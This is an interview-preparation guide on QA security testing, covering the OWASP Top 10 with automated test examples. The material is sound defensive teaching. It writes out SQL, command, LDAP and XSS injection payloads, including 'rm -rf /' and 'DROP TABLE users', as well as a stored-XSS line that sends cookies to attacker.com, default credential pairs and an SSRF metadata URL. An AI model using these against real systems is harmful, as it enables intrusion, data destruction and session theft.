# Security Testing — Full Q&A Interview Guide | OWASP Top 10 + Practical Testing

> Senior QA Interview Preparation — Every concept answered as a real interview question

---

## SECTION 1 — Security Testing Fundamentals

---

**Q1: What is security testing and why does QA do it?**

**A:** Security testing is the process of identifying vulnerabilities, weaknesses, and risks in a software application that could be exploited by an attacker to gain unauthorised access, steal data, cause disruption, or manipulate the system.

QA engineers perform security testing because vulnerabilities found after production release are exponentially more expensive to fix. The average cost of a data breach is $4.45 million (IBM, 2023). QA is the last structured gate before release. If security is not checked in QA, it reaches production.

QA security testing is not the same as a full penetration test — it is a first-pass, application-layer check covering the most common and highest-frequency vulnerabilities, particularly the OWASP Top 10.

**Note:** Security testing in QA is sometimes called "security smoke testing" or "application security QA." It runs alongside functional testing as a standard part of the test cycle — not as a once-a-year event.

---

**Q2: What is QA's role in security testing versus the dedicated security team's role?**

**A:** The two roles are complementary but operate at different depths.

| QA Does | Penetration Testers / Security Engineers Do |
|---------|---------------------------------------------|
| Black-box testing — test as an external user | Deep technical exploitation of the full attack surface |
| OWASP Top 10 awareness and coverage | Custom exploit development |
| Input validation testing (injection payloads) | Full network and infrastructure testing |
| Authentication and session testing | Privilege escalation chains across components |
| API parameter manipulation (IDOR, mass assignment) | Binary and memory analysis |
| Checking HTTP headers, HTTPS, cookie flags | Social engineering testing |
| Raising security defects with proper handling | Full formal written penetration test report |
| Regression-testing security bug fixes | Threat modelling for new architecture |

**QA security testing:** performed during every test cycle, hours to days, uses standard tools.
**Penetration testing:** performed by specialists once or twice a year, takes weeks, uses advanced tooling and custom exploits.

Both are necessary. Neither replaces the other.

---

**Q3: What is the OWASP Top 10? Why is it important for QA to know it?**

**A:** OWASP stands for Open Web Application Security Project — a non-profit organisation that produces freely available security resources. The OWASP Top 10 is the globally recognised list of the most critical web application security risks, updated every few years based on data from thousands of real-world applications.

It is the standard that QA engineers, security teams, developers, and auditors all reference. Knowing it tells you *what* to look for during security testing and gives you a common vocabulary when raising security defects.

**The OWASP Top 10 (2021 edition):**

1. A01 — Broken Access Control
2. A02 — Cryptographic Failures
3. A03 — Injection
4. A04 — Insecure Design
5. A05 — Security Misconfiguration
6. A06 — Vulnerable and Outdated Components
7. A07 — Identification and Authentication Failures
8. A08 — Software and Data Integrity Failures
9. A09 — Security Logging and Monitoring Failures
10. A10 — Server-Side Request Forgery (SSRF)

**Note:** In interviews, interviewers frequently ask you to name the Top 10 from memory and then pick one or two to explain in detail. Know all ten names. Know how to test A01, A03, A05, and A07 deeply — these come up most often in QA interviews.

---

## SECTION 2 — Broken Access Control and IDOR

---

**Q4: What is Broken Access Control (OWASP A01)? Why is it ranked number one?**

**A:** Broken Access Control means users can access resources or perform actions beyond what they are permitted to do. It is ranked number one because it is the most commonly found vulnerability in web applications — present in 94% of applications tested according to OWASP's data.

**Real examples:**
- User A views their profile at `/api/users/1234` and changes `1234` to `1235` and sees User B's private data
- A standard user navigates directly to `/admin/dashboard` and sees the admin panel
- An authenticated user sends a DELETE request to an endpoint that should be admin-only
- A user who did not complete payment can navigate directly to the order confirmation page

**What QA checks:**
1. Can a standard user access admin-only pages?
2. Can User A access User B's private resources by changing the ID?
3. Can an unauthenticated user access protected pages?
4. Can a user perform privileged actions (delete, approve, refund) that their role does not allow?

**Expected:** 403 Forbidden or redirect to the user's own data.
**Failure:** Data from another user is returned, or a privileged action succeeds.

---

**Q5: What is IDOR? Give a step-by-step test for it.**

**A:** IDOR stands for Insecure Direct Object Reference. It is a specific type of Broken Access Control where an application uses a user-controllable value — such as a numeric ID in a URL or request body — to look up a record without verifying the requesting user is authorised to access that specific record.

The attacker simply guesses or increments the ID to access another user's data.

**Step-by-step IDOR test:**

1. Create two test accounts: User A (`userA@test.com`) and User B (`userB@test.com`)
2. Log in as User A. Capture the session token.
3. Perform an action that returns User A's ID in the URL or API response. For example: `GET /api/orders/5001` — note the order ID 5001 belongs to User A.
4. In a second browser or using a tool like Burp Suite Repeater, log in as User A but request User B's order: `GET /api/orders/5002` (User B's order ID).
5. Also try: send `GET /api/orders/5002` using User A's token (not User B's).
6. Also try: send the request with no authentication token at all.

**Expected result at each step:** HTTP 403 Forbidden. The response body must not contain User B's order details.

**Failure:** User A receives User B's order data. HTTP 200 is returned.

**What else to test:**
- Increment numeric IDs (1001, 1002, 1003) — are sequential IDs guessable?
- Replace a UUID with another user's UUID captured from a different part of the application
- Test IDOR on: orders, messages, documents, invoices, payment methods, user profiles

```java
@Test
public void testUserCannotAccessAnotherUsersOrder() {
    // Log in as User A
    String tokenUserA = loginAndGetToken("userA@example.com", "Password123!");

    // Attempt to access User B's order (ID belongs to User B)
    given()
        .header("Authorization", "Bearer " + tokenUserA)
    .when()
        .get("/api/orders/ORDER-B-99999")
    .then()
        .statusCode(403)
        .body(not(containsString("userB@example.com")))
        .body(not(containsString("B's item name")));
}
```

---

## SECTION 3 — Cryptographic Failures

---

**Q6: What is Cryptographic Failures (OWASP A02)? What does QA check for it?**

**A:** Cryptographic Failures (previously called "Sensitive Data Exposure") covers situations where sensitive data is not adequately protected — either because encryption is missing, weak, or incorrectly applied.

**Examples of cryptographic failures:**
- Application uses HTTP instead of HTTPS — data is in plaintext on the wire
- Passwords stored as MD5 hashes — MD5 is broken and crackable in seconds
- API keys or tokens visible in GET request query strings (they end up in server logs)
- Sensitive data (password, full card number, token) returned in an API response
- SSL certificate expired or using outdated protocols (SSL 3.0, TLS 1.0)
- Sensitive data written to application logs in plaintext

**What QA checks:**

1. **HTTPS everywhere:** Do all pages serving sensitive data (login, profile, checkout) use HTTPS? Try accessing via HTTP — does it redirect to HTTPS?
2. **No secrets in URLs:** Open browser DevTools (Network tab). Do any requests carry tokens, passwords, or sensitive IDs as query parameters (visible in the URL bar and in server logs)?
3. **API response inspection:** Do API responses ever return passwords, full card numbers, or raw tokens? These should never appear in a response.
4. **SSL/TLS quality:** Use ssllabs.com/ssltest to check the server's certificate, cipher suites, and protocol support. Expect an A or A+ grade.
5. **Cookie flags:** Are session cookies marked `Secure` (not sent over HTTP) and `HttpOnly` (not accessible to JavaScript)?
6. **Stack traces in errors:** Trigger an error — does the response reveal a file path, database name, or internal stack trace?

```bash
# Quick header check using curl
curl -I https://example.com

# Expected security-related headers:
# Strict-Transport-Security: max-age=31536000; includeSubDomains
# Set-Cookie: sessionId=...; Secure; HttpOnly; SameSite=Strict
```

---

## SECTION 4 — Injection Testing

---

**Q7: What is Injection (OWASP A03)? What types of injection exist?**

**A:** Injection occurs when untrusted user-supplied data is sent to an interpreter — a database, operating system, LDAP server, or browser — as part of a command or query, and the interpreter cannot distinguish between the data and the command. The attacker manipulates the query to access, modify, or delete data they should not be able to.

**Types of injection:**

| Type | Interpreter | Example |
|------|-------------|---------|
| SQL Injection | Database (SQL) | `' OR 1=1 --` in a login field |
| Cross-Site Scripting (XSS) | Browser (JavaScript) | `<script>alert(1)</script>` in a comment field |
| Command Injection (OS) | Operating system shell | `; rm -rf /` in a filename field |
| LDAP Injection | LDAP directory | `*)(uid=*))(|(uid=*` in a username field |
| XML/XPath Injection | XML parser | `' or 1=1 or 'x'='x` in XML-based search |
| Template Injection (SSTI) | Template engine | `{{7*7}}` or `${7*7}` in form fields |
| Header Injection | HTTP layer | Newline characters in header values |

**Key principle:** Test every input point. This includes form fields, URL parameters, HTTP headers (User-Agent, Referer, Cookie values), file upload names, and API request body fields.

---

**Q8: What is SQL Injection? What test inputs do you use and what is the expected result?**

**A:** SQL Injection (SQLi) occurs when user input is included in a SQL query without being properly parameterised or sanitised. The attacker can bypass authentication, read all data from the database, modify or delete data, and in some configurations execute operating system commands.

**Test payloads for login forms (enter in both email and password fields):**

| Payload | What It Tests |
|---------|---------------|
| `'` | Single quote — triggers a syntax error in unparameterised queries |
| `' OR '1'='1` | Classic authentication bypass — always evaluates to true |
| `' OR 1=1 --` | Bypass with numeric comparison and comment to drop the rest of the query |
| `admin'--` | Comment out the password check entirely |
| `' OR 'x'='x` | Another always-true condition |
| `'; DROP TABLE users; --` | Stacked query — attempts to delete the users table |
| `' UNION SELECT NULL, NULL --` | Union-based injection probe |

**Test payloads for search fields and URL parameters:**

| Payload | What It Tests |
|---------|---------------|
| `test'` | Basic SQL probe |
| `test' AND '1'='1` | Boolean-based: should return results |
| `test' AND '1'='2` | Boolean-based: should return NO results — different responses confirm injection |
| `test' ORDER BY 1--` | Column count probe |

**Expected result:** Login fails with a generic error message (e.g. "Invalid email or password"). HTTP 400 or 401. No 500 error. No database-specific error message in the response.

**Failure indicators:**
- HTTP 500 Internal Server Error
- Error message containing "SQL syntax", "ORA-", "MySQL", "MSSQL", "sqlite_", "syntax error near"
- Login succeeds with an injection payload and no valid credentials
- Data from other users is returned

---

**Q9: Show a complete RestAssured test for SQL injection.**

**A:**

```java
import io.restassured.RestAssured;
import io.restassured.http.ContentType;
import org.testng.annotations.Test;
import static io.restassured.RestAssured.given;
import static org.hamcrest.Matchers.*;

public class SqlInjectionTest {

    @Test(description = "Login endpoint must reject SQL injection payloads without returning 500 or DB errors")
    public void testLoginWithSqlInjectionPayloads() {
        String[] sqlInjectionPayloads = {
            "' OR '1'='1",
            "' OR 1=1 --",
            "admin'--",
            "' OR 'x'='x",
            "'; DROP TABLE users; --",
            "' UNION SELECT NULL, NULL --"
        };

        for (String payload : sqlInjectionPayloads) {
            given()
                .contentType(ContentType.JSON)
                .body("{\"email\": \"" + payload + "\", \"password\": \"anything\"}")
            .when()
                .post("/api/auth/login")
            .then()
                // Must NOT return 200 — that would mean the payload bypassed authentication
                .statusCode(not(200))
                // Must NOT return 500 — that would indicate an unhandled SQL error
                .statusCode(not(500))
                // Should return 400 (bad request) or 401 (unauthorised)
                .statusCode(anyOf(is(400), is(401)))
                // Response body must NOT contain database error strings
                .body(not(containsString("SQL syntax")))
                .body(not(containsString("ORA-")))
                .body(not(containsString("mysql_fetch")))
                .body(not(containsString("syntax error")))
                .body(not(containsString("MSSQL")))
                .body(not(containsString("sqlite_")));
        }
    }

    @Test(description = "Search endpoint must not expose all records when SQL injection is attempted")
    public void testSearchEndpointWithSqlInjectionPayload() {
        given()
            .queryParam("q", "test' OR 1=1 --")
        .when()
            .get("/api/products/search")
        .then()
            // Either filtered result (200) or validation rejection (400)
            .statusCode(anyOf(is(200), is(400)))
            // If 200, must not return all records (which would indicate injection succeeded)
            .body("size()", lessThan(100))
            .body(not(containsString("SQL syntax")));
    }

    @Test(description = "URL parameter must be sanitised against SQL injection")
    public void testUrlParameterSanitisation() {
        given()
        .when()
            .get("/api/products?id=1' OR 1=1")
        .then()
            .statusCode(anyOf(is(200), is(400), is(404)))
            .statusCode(not(500))
            .body(not(containsString("syntax error")));
    }
}
```

**Note for interview:** The key assertions are: never 500, never a database error string in the body, never a 200 for a bypass payload. These three together prove the application is not vulnerable to SQL injection at the tested endpoints.

---

## SECTION 5 — XSS Testing

---

**Q10: What is Cross-Site Scripting (XSS)? What are the three types?**

**A:** Cross-Site Scripting (XSS) is an injection vulnerability where an attacker injects malicious JavaScript into a web page that is then executed in other users' browsers. The attacker cannot steal server-side data directly — instead they steal session cookies, redirect users, capture keystrokes, or perform actions on behalf of the victim.

**Three types:**

**Reflected XSS:** The payload is in the request (URL parameter or form input) and is immediately reflected in the response. The page is not storing it — it bounces the input back. The victim must click a crafted link to be affected.

**Stored XSS (Persistent):** The payload is saved to the database — in a comment, profile field, forum post, or product review — and is executed every time any user views the page containing it. No crafted link required. Considered more dangerous.

**DOM-Based XSS:** The vulnerability is in the client-side JavaScript itself. The script reads from a source like `document.location` or `window.name` and writes it to the DOM using `innerHTML` without encoding. The server never sees the payload — it is entirely client-side.

---

**Q11: What is the difference between reflected and stored XSS? Which is worse and why?**

**A:**

| | Reflected XSS | Stored XSS |
|---|---|---|
| Where payload lives | In the request — URL or form input | In the database — comment, profile, post |
| Victim trigger | Victim must click a specially crafted link | Victim just visits the page normally |
| Persistence | One-time — each visit requires a new crafted link | Permanent — all users who view the page are affected |
| Scope | Targets one user at a time | Can affect every user who views the page simultaneously |
| Severity | Medium to High | High to Critical |

**Stored XSS is worse** because it requires no social engineering to deliver the payload. An attacker posts a malicious comment containing `<script>document.location='https://attacker.com/?c='+document.cookie</script>`. Every user who views that comment page has their session cookie stolen and sent to the attacker's server — without clicking anything unusual.

Reflected XSS requires the attacker to trick the victim into clicking a link, which limits its reach.

---

**Q12: What XSS payloads do you use in testing?**

**A:** Start with the simplest payload and escalate to event-handler variants that bypass basic filters.

| Payload | Purpose |
|---------|---------|
| `<script>alert(1)</script>` | Basic probe — does the script tag execute? |
| `<script>alert(document.cookie)</script>` | Cookie theft probe — proves real-world impact |
| `"><script>alert(1)</script>` | Break out of a double-quoted HTML attribute |
| `'><script>alert(1)</script>` | Break out of a single-quoted HTML attribute |
| `<img src=x onerror=alert(1)>` | Event handler — executes on broken image load, bypasses many script-tag filters |
| `<svg onload=alert(1)>` | SVG-based execution — bypasses filters that only block `<script>` |
| `javascript:alert(1)` | In `href` attributes — test link fields |
| `<body onload=alert(1)>` | Body event handler |
| `<input autofocus onfocus=alert(1)>` | Fires on page focus — no click required |
| `<iframe src="javascript:alert(1)">` | Iframe-based |

**Where to test:** Login fields, search bars, comment fields, profile bio, name, address, URL parameters (`?search=`, `?name=`, `?redirect=`), contact forms, file upload filenames, HTTP headers (User-Agent, Referer) if they appear in error pages.

---

**Q13: How do you verify XSS is prevented? Show a Playwright test example.**

**A:** The correct way to verify XSS prevention programmatically is to listen for `dialog` events in Playwright (which fire when `alert()`, `confirm()`, or `prompt()` are called) and assert they never fire. Also assert that the payload is HTML-encoded in the page source — `<script>` becomes `&lt;script&gt;`.

```typescript
import { test, expect } from '@playwright/test';

test('search field does not execute injected script tag (reflected XSS)', async ({ page }) => {
  // Track whether any alert dialog fires
  let alertFired = false;
  page.on('dialog', async dialog => {
    alertFired = true;
    await dialog.dismiss(); // dismiss to prevent test from hanging
  });

  await page.goto('/search');
  await page.fill('input[name="q"]', '<script>alert(1)</script>');
  await page.press('input[name="q"]', 'Enter');
  await page.waitForLoadState('networkidle');

  // No alert dialog should have fired
  expect(alertFired).toBe(false);

  // Payload must be HTML-encoded in the rendered page source
  const pageContent = await page.content();
  expect(pageContent).not.toContain('<script>alert(1)</script>');   // raw script must not be there
  expect(pageContent).toContain('&lt;script&gt;');                  // encoded form is acceptable
});

test('comment field does not store and execute XSS payload (stored XSS)', async ({ page }) => {
  let alertFired = false;
  page.on('dialog', async dialog => {
    alertFired = true;
    await dialog.dismiss();
  });

  // Step 1: Log in as the attacker and submit the XSS payload
  await page.goto('/login');
  await page.fill('#email', 'attacker@example.com');
  await page.fill('#password', 'TestPassword123!');
  await page.click('button[type="submit"]');

  await page.goto('/forum/post/123');
  await page.fill('textarea[name="comment"]', '<img src=x onerror=alert(document.cookie)>');
  await page.click('button[type="submit"]');

  // Step 2: Log in as the victim and view the same page
  await page.goto('/logout');
  await page.goto('/login');
  await page.fill('#email', 'victim@example.com');
  await page.fill('#password', 'TestPassword123!');
  await page.click('button[type="submit"]');

  await page.goto('/forum/post/123');
  await page.waitForLoadState('networkidle');

  // The stored payload must not execute in the victim's browser
  expect(alertFired).toBe(false);
});
```

---

## SECTION 6 — Insecure Design and Rate Limiting

---

**Q14: What is Insecure Design (OWASP A04)? How do you test rate limiting?**

**A:** Insecure Design covers security weaknesses that are baked into the design of the application — not bugs in the implementation, but missing security controls at the design level. The control was never designed in, so no amount of patching the implementation fixes it without changing the design.

**Real examples:**
- No rate limiting on the login endpoint — allows unlimited brute-force attempts
- No CAPTCHA on account registration — allows automated bot account creation
- Password reset sends the new password in a plain text email rather than a reset link
- Business logic allows a user to skip the payment step and jump directly to order confirmation
- OTP (one-time password) is a 4-digit number with no attempt limit — 10,000 combinations, trivially guessable

**How to test rate limiting:**

Send repeated requests in rapid succession and assert that after a threshold is crossed, the server responds with HTTP 429 Too Many Requests.

```java
@Test
public void testLoginEndpointHasRateLimiting() {
    boolean rateLimitHit = false;
    int requestCount = 0;

    for (int i = 0; i < 50; i++) {
        int statusCode = given()
            .contentType(ContentType.JSON)
            .body("{\"email\": \"test@example.com\", \"password\": \"WrongPassword" + i + "\"}")
        .when()
            .post("/api/auth/login")
        .then()
            .extract().statusCode();

        requestCount++;

        if (statusCode == 429) {
            rateLimitHit = true;
            // Also verify the Retry-After header is present
            given()
                .contentType(ContentType.JSON)
                .body("{\"email\": \"test@example.com\", \"password\": \"WrongPassword\"}")
            .when()
                .post("/api/auth/login")
            .then()
                .header("Retry-After", notNullValue());
            break;
        }
    }

    assertTrue(rateLimitHit,
        "Rate limiting was not triggered after " + requestCount + " rapid login attempts");
}
```

**Also verify:** The rate limit applies per IP address, not just per account. After the window resets (as specified by the Retry-After header), requests are accepted again.

---

## SECTION 7 — Security Misconfiguration

---

**Q15: What is Security Misconfiguration (OWASP A05)? What do you check?**

**A:** Security Misconfiguration occurs when security settings are incorrectly configured, left at defaults, or missing entirely. It covers the infrastructure and application configuration layer — not the application code itself.

**Common examples:**
- Debug mode enabled in production (exposes stack traces, configuration details, internal paths)
- Default admin credentials never changed (admin/admin, admin/password)
- Directory listing enabled (`http://example.com/uploads/` lists all files)
- Verbose error messages revealing database structure, file paths, or SQL queries
- Missing HTTP security headers (Content-Security-Policy, X-Frame-Options, etc.)
- Sensitive files accessible via URL (`/.env`, `/config.json`, `/backup.sql`)
- Unused features enabled (unnecessary APIs, services, ports)

**What QA checks:**

1. Access common sensitive paths: `/.env`, `/config.json`, `/backup.sql`, `/debug`, `/console`, `/admin`, `/phpinfo.php` — expect 404 or 403, never content.
2. Check HTTP response headers using curl or browser DevTools — are all security headers present?
3. Trigger an error (submit malformed input) — does the error message reveal database names, file paths, or stack traces?
4. Try default credentials on the admin interface.
5. Check if directory listing is enabled on upload or asset directories.

```bash
# Check HTTP security headers with curl
curl -I https://example.com

# Required headers to verify:
# X-Content-Type-Options: nosniff
# X-Frame-Options: DENY
# Strict-Transport-Security: max-age=31536000; includeSubDomains
# Content-Security-Policy: default-src 'self'
# Referrer-Policy: no-referrer
# Permissions-Policy: geolocation=(), microphone=()
```

---

**Q16: How do you test for debug mode being enabled in production?**

**A:** Debug mode in production is a common and serious misconfiguration. When enabled, it typically exposes detailed error messages, internal file paths, stack traces, configuration values, database query strings, and sometimes an interactive debugger.

**How to test:**

1. Trigger an application error deliberately: submit a malformed request, send unexpected data types, enter an extremely long string, or navigate to a URL that references a non-existent resource.
2. Observe the error response. A secure production application should return a generic, user-friendly error page (e.g. "Something went wrong") with no internal details.
3. Check if an interactive debug console is accessible at `/debug`, `/console`, or framework-specific paths (e.g. `/__debug__/` for Django Debug Toolbar).

**Failure indicators:**
- Stack trace with file paths visible in the browser
- Database query exposed in the error response
- Internal IP address or server hostname visible
- Framework-specific debug panel rendered (e.g. Django debug page, Flask debug console)
- Error response contains: `app.config`, `DEBUG = True`, class names, method names, line numbers

**Severity:** High to Critical — an attacker can use stack traces to understand the codebase, identify vulnerable paths, and extract configuration secrets.

---

**Q17: How do you test for default credentials?**

**A:** Many applications and services ship with default credentials that administrators are expected to change. If they are not changed, an attacker can trivially gain access.

**Credentials to always test on any admin interface or login page:**

```
admin / admin
admin / password
admin / 123456
admin / admin123
administrator / administrator
root / root
root / password
[appname] / [appname]   (e.g. if the app is called "portal" — portal/portal)
test / test
guest / guest
```

**How to test with RestAssured:**

```java
@Test
public void testDefaultCredentialsAreRejected() {
    String[][] defaultCredentials = {
        {"admin", "admin"},
        {"admin", "password"},
        {"admin", "123456"},
        {"root", "root"},
        {"administrator", "administrator"},
        {"test", "test"}
    };

    for (String[] creds : defaultCredentials) {
        given()
            .contentType(ContentType.JSON)
            .body("{\"email\": \"" + creds[0] + "\", \"password\": \"" + creds[1] + "\"}")
        .when()
            .post("/api/auth/login")
        .then()
            .statusCode(401)
            .body("message", not(containsString("Welcome")));
    }
}
```

**Note:** Also test on any third-party components bundled with the application — databases, admin panels (phpMyAdmin, Kibana, Grafana), message brokers, and CI/CD tools.

---

## SECTION 8 — Authentication and Session Testing

---

**Q18: What is account lockout testing? How many attempts should trigger lockout?**

**A:** Account lockout testing verifies that after a configurable number of failed login attempts, the account is temporarily locked or rate-limited to prevent brute force attacks.

**Industry standard:** 5 to 10 failed attempts before lockout. After lockout, the account should remain locked for a minimum time (e.g. 15–30 minutes) or until unlocked by an admin.

**How to test:**

```java
@Test
public void testAccountLocksAfterRepeatedFailedLogins() {
    String email = "lockout-test@example.com";

    // Attempt login 10 times with wrong password
    for (int i = 0; i < 10; i++) {
        given()
            .contentType(ContentType.JSON)
            .body("{\"email\": \"" + email + "\", \"password\": \"WrongPassword" + i + "\"}")
        .when()
            .post("/api/auth/login")
        .then()
            .statusCode(anyOf(is(401), is(429)));
    }

    // After lockout threshold, even the CORRECT password should be rejected
    given()
        .contentType(ContentType.JSON)
        .body("{\"email\": \"" + email + "\", \"password\": \"CorrectPassword123!\"}")
    .when()
        .post("/api/auth/login")
    .then()
        // 423 Locked, 429 Too Many Requests — either is acceptable
        .statusCode(anyOf(is(401), is(423), is(429)));
}
```

**Also verify:** The lockout message does not reveal whether the account exists (avoid user enumeration). The lockout applies to the account, not just the IP. There is an unlock mechanism (time-based or admin-triggered).

---

**Q19: What is session fixation? How do you test it?**

**A:** Session fixation is an attack where an attacker obtains a valid pre-authentication session token (e.g. from visiting the login page), tricks the victim into authenticating using that same token, and then uses the token to access the victim's authenticated session.

The defence is simple and mandatory: the server must issue a brand-new session token immediately after a successful authentication. The pre-login token must be invalidated.

**How to test:**

```java
@Test
public void testSessionTokenChangesAfterLogin() {
    // Step 1: Get the session token before logging in (anonymous session)
    String preLoginToken = given()
    .when()
        .get("/api/session")
    .then()
        .statusCode(200)
        .extract().path("sessionToken");

    // Step 2: Log in
    String postLoginToken = given()
        .contentType(ContentType.JSON)
        .body("{\"email\": \"user@example.com\", \"password\": \"Password123!\"}")
    .when()
        .post("/api/auth/login")
    .then()
        .statusCode(200)
        .extract().path("token");

    // Step 3: The pre-login and post-login tokens MUST be different
    assertThat(preLoginToken, not(equalTo(postLoginToken)));

    // Step 4: The pre-login token must no longer be accepted
    given()
        .header("Authorization", "Bearer " + preLoginToken)
    .when()
        .get("/api/user/profile")
    .then()
        .statusCode(401); // Old token must be invalid after login
}
```

---

**Q20: How do you test that logout invalidates the session token?**

**A:** After a user logs out, their session token must be server-side invalidated. If the token remains valid after logout, any attacker who captured the token (from logs, browser history, a shared computer) can continue to use it indefinitely.

```java
@Test
public void testLogoutInvalidatesSessionToken() {
    // Step 1: Log in and get a token
    String token = given()
        .contentType(ContentType.JSON)
        .body("{\"email\": \"user@example.com\", \"password\": \"Password123!\"}")
    .when()
        .post("/api/auth/login")
    .then()
        .statusCode(200)
        .extract().path("token");

    // Step 2: Verify the token works before logout
    given()
        .header("Authorization", "Bearer " + token)
    .when()
        .get("/api/user/profile")
    .then()
        .statusCode(200); // Token is valid

    // Step 3: Log out
    given()
        .header("Authorization", "Bearer " + token)
    .when()
        .post("/api/auth/logout")
    .then()
        .statusCode(200);

    // Step 4: Attempt to use the same token after logout — must be rejected
    given()
        .header("Authorization", "Bearer " + token)
    .when()
        .get("/api/user/profile")
    .then()
        .statusCode(401); // Token must be invalidated — not 200
}
```

**Note:** A common failure mode is that the server issues JWT tokens with no server-side tracking. When the user "logs out," the client discards the token, but the server never blacklists it. If the attacker has the token, it remains valid until it expires. This is a security defect — the server must maintain a token revocation mechanism.

---

**Q21: What is password complexity testing? Show the test.**

**A:** Password complexity testing verifies that the application enforces minimum password strength requirements and rejects weak passwords during registration and password change flows.

**Minimum requirements typically enforced:**
- At least 8–12 characters (longer is better)
- At least one uppercase letter
- At least one lowercase letter
- At least one digit
- At least one special character
- Not a commonly used password (checked against a list)

```java
@Test
public void testWeakPasswordsAreRejectedAtRegistration() {
    String[] weakPasswords = {
        "123456",       // all digits, too short
        "password",     // common word
        "abc",          // too short
        "12345678",     // all digits
        "qwerty",       // keyboard pattern
        "Password",     // no digit or special char
        "Pass1",        // too short
        "ALLCAPS123"    // no lowercase
    };

    for (String weakPassword : weakPasswords) {
        given()
            .contentType(ContentType.JSON)
            .body("{\"email\": \"newuser@example.com\", \"password\": \"" + weakPassword + "\"}")
        .when()
            .post("/api/auth/register")
        .then()
            .statusCode(400)
            .body("errors", hasItem(containsString("password")));
    }
}
```

---

## SECTION 9 — API Security Testing

---

**Q22: What is mass assignment? How do you test for it?**

**A:** Mass assignment is a vulnerability where an API endpoint blindly accepts all fields in a request body and maps them directly to the underlying data model — including privileged fields the user should not be able to set (like `role`, `isAdmin`, `balance`, `verified`).

**Example:** A user updates their profile name. The application accepts the full JSON body. An attacker adds `"role": "admin"` to the body. If the application maps all incoming fields without a whitelist, the attacker is now an admin.

**How to test:**

```java
@Test
public void testMassAssignmentPreventsPrivilegeEscalation() {
    String token = loginAndGetToken("regularuser@example.com", "Password123!");

    // Send extra privileged fields alongside the legitimate update
    given()
        .header("Authorization", "Bearer " + token)
        .contentType(ContentType.JSON)
        .body("{\"name\": \"My Updated Name\", \"role\": \"admin\", \"isAdmin\": true, \"balance\": 999999}")
    .when()
        .put("/api/user/profile")
    .then()
        // Accept the update (200) or reject the extra fields (400) — either is fine
        .statusCode(anyOf(is(200), is(400)));

    // Most important: verify the privileged fields were NOT applied
    given()
        .header("Authorization", "Bearer " + token)
    .when()
        .get("/api/user/profile")
    .then()
        .statusCode(200)
        .body("role", not(equalTo("admin")))
        .body("isAdmin", equalTo(false))
        .body("balance", not(equalTo(999999)));
}
```

**Other fields to try adding:** `verified`, `emailVerified`, `subscriptionTier`, `credits`, `createdAt`, `deletedAt`, `permissions`.

---

**Q23: What is verb tampering? Give an example.**

**A:** HTTP verb (method) tampering is when an attacker sends a request using an unexpected HTTP method to bypass access controls or trigger unintended behaviour. For example, if an application has a DELETE endpoint that is protected, an attacker might try sending a POST or PUT request to the same URL to see if it performs the deletion without the access check.

**How to test:**

```java
@Test
public void testReadOnlyEndpointRejectsDeleteAndPatch() {
    String token = loginAndGetToken("user@example.com", "Password123!");

    // This endpoint only supports GET — DELETE should be rejected
    given()
        .header("Authorization", "Bearer " + token)
    .when()
        .delete("/api/public/announcements/1")
    .then()
        .statusCode(anyOf(is(403), is(405))); // 403 Forbidden or 405 Method Not Allowed

    // PATCH should also be rejected on a read-only endpoint
    given()
        .header("Authorization", "Bearer " + token)
        .contentType(ContentType.JSON)
        .body("{\"title\": \"Hacked\"}")
    .when()
        .patch("/api/public/announcements/1")
    .then()
        .statusCode(anyOf(is(403), is(405)));
}

@Test
public void testPostOnlyEndpointRejectsGetRequest() {
    // A POST-only endpoint (like login) should not respond to GET
    given()
    .when()
        .get("/api/auth/login")
    .then()
        .statusCode(405); // 405 Method Not Allowed
}
```

**Note:** 405 Method Not Allowed is the correct response when the method is not supported. 403 Forbidden is acceptable when the method is known but the user has no permission for it.

---

**Q24: What is rate limiting? How do you test it with RestAssured?**

**A:** Rate limiting is a control that restricts the number of requests a client can make to an endpoint within a given time window. Its purpose is to prevent brute force attacks, credential stuffing, scraping, and denial-of-service attacks.

A correctly configured rate limit should:
- Return 429 Too Many Requests after the threshold is exceeded
- Include a `Retry-After` header indicating when the client may retry
- Apply the limit per IP address, not just per account

```java
@Test
public void testLoginEndpointHasRateLimiting() {
    int requestCount = 0;
    boolean rateLimitHit = false;

    for (int i = 0; i < 50; i++) {
        int statusCode = given()
            .contentType(ContentType.JSON)
            .body("{\"email\": \"test@example.com\", \"password\": \"WrongPassword\"}")
        .when()
            .post("/api/auth/login")
        .then()
            .extract().statusCode();

        requestCount++;

        if (statusCode == 429) {
            rateLimitHit = true;

            // Also verify Retry-After header is present in the 429 response
            given()
                .contentType(ContentType.JSON)
                .body("{\"email\": \"test@example.com\", \"password\": \"WrongPassword\"}")
            .when()
                .post("/api/auth/login")
            .then()
                .statusCode(429)
                .header("Retry-After", notNullValue());

            break;
        }
    }

    assertTrue(rateLimitHit,
        "Rate limiting not triggered after " + requestCount + " rapid requests. " +
        "Endpoint is vulnerable to brute force.");
}
```

---

**Q25: What is SSRF? How does QA test for it?**

**A:** SSRF stands for Server-Side Request Forgery. The vulnerability allows an attacker to make the application's server send HTTP requests to a URL the attacker controls. The server is being used as a proxy to reach internal systems, cloud metadata endpoints, or other resources that are not directly accessible to the attacker from the internet.

**Classic scenario:** An application allows users to provide a URL for importing a profile image from the web. The attacker enters `http://169.254.169.254/latest/meta-data/iam/security-credentials/` — the AWS instance metadata endpoint. The server fetches it and returns the cloud credentials.

**How QA tests for SSRF:**

1. Identify all features that take a URL as user input: profile image URL, webhook URL, feed import URL, link preview, site screenshot tools.
2. Enter `http://localhost:8080/admin` — does the response contain the admin panel?
3. Enter `http://127.0.0.1/` — does the server return its own content?
4. Enter `http://169.254.169.254/latest/meta-data/` — AWS cloud metadata URL.
5. Use webhook.site (generates a unique public URL) — enter that URL and see if the server makes a request to it. Any hit on your webhook confirms the server is making outbound requests.

**Expected:** The application validates the URL against an allowlist (only allowed public domains). Internal URLs, localhost, and cloud metadata endpoints are blocked with a 400 or 422 response.

**Failure:** Server returns internal content, cloud credentials, or the webhook.site endpoint receives a hit.

---

## SECTION 10 — Security Testing Tools

---

**Q26: What tools do QA engineers use for security testing?**

**A:** The practical toolkit for a QA engineer doing application security testing:

| Tool | Purpose | Cost |
|------|---------|------|
| **Burp Suite Community** | HTTP proxy — intercept and modify requests, replay requests with different payloads | Free |
| **OWASP ZAP** | Automated web vulnerability scanner | Free |
| **browser DevTools** | Inspect HTTP headers, cookies, network requests, JavaScript execution | Free (built in) |
| **curl** | Command-line HTTP requests for header checks | Free (built in) |
| **SSL Labs** (ssllabs.com/ssltest) | HTTPS configuration and certificate quality check | Free online |
